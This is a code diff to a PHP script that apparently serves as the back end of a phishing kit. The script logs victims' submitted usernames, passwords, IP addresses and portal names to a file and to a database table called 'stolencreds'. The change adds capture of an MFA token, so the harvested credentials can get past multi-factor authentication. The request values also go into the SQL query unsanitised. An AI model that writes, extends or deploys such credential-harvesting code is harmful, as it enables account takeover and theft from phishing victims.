@@ -20,6 +20,7 @@ $portal = $_REQUEST['project'];
 $redirect = $_REQUEST['redirect'];
 
 // Receives Optional Parameters and Overrides Variables
+if(isset($_REQUEST['token'])){$MFAToken = $_REQUEST['token'];}else{$MFAToken = "";}
 if(isset($_REQUEST['slackemoji'])){$slackemoji = $_REQUEST['slackemoji'];}
 if(isset($_REQUEST['slackbotname'])){$slackbotname = $_REQUEST['slackbotname'];}
 
@@ -46,7 +47,7 @@ fwrite($myfile, "\n". $txt);
 fclose($myfile);
 
 // Inserts Captured Information Into MySQL DB
-$sql = "INSERT INTO stolencreds(username,password,entered,ip,location) VALUES('$user','$pass',NOW(),'$ip','$portal');";
+$sql = "INSERT INTO stolencreds(username,password,entered,ip,location,token) VALUES('$user','$pass',NOW(),'$ip','$portal','$MFAToken');";
 $result = $conn->query($sql);
 
 printf($conn->error);
